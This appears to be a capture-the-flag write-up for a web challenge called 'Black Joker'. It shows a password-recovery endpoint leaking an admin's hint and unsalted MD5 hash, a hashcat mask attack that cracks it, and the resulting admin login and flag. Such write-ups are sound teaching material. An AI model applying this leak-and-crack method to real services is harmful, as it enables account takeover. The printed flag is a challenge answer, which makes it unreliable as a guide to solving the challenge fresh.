
# Black Joker
![Black Joker](black_jocker.png)

On port 8123, we have an admin login prompt at 
http://172.15.41.117:8123/admin

and a sign up page
http://172.15.41.117:8123/sign-up

There is also a password recovery page
http://172.15.41.117:8123/hint

This last one is interesting. Using burpsuite to capture the request/reesponse for the admin account listed on the front page: 

REQUEST:
```
POST /password-recovery HTTP/1.1
Host: 172.15.41.117:8123
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: http://172.15.41.117:8123
Connection: close
Referer: http://172.15.41.117:8123/hint

{"email":"admin@example.com"}
```

RESPONSE:
```
HTTP/1.0 200 OK
Date: Sun, 06 Dec 2020 06:46:42 GMT
Server: WSGIServer/0.2 CPython/3.8.5
Content-Type: application/json
Content-Length: 168

{"id": 0, 
"name": "Jim \"Hate Salt\" Jones", 
"email": "admin@example.com", 
"hint": "The password begins with \"ihatesalt\"", 
"hash": "7f35f82c933186704020768fd08c2f69"
}
```

We have a partial string and an MD5? hash, fire up hashcat and get a pattern crafted:
```
hashcat -m0 7f35f82c933186704020768fd08c2f69 -a 3 -1 ?l?d -i ihatesalt?1?1?1?1?1
```

In not too much time we get 
```
7f35f82c933186704020768fd08c2f69:ihatesaltalot7 
```

As promised, "salt free hash." So now we know his password is ihatesaltalot7.  What is his username?

After a couple trys find out it's just the full email.

FLAG:
```
4192e8fbfd17de573b9d29fab0ab2f40
```


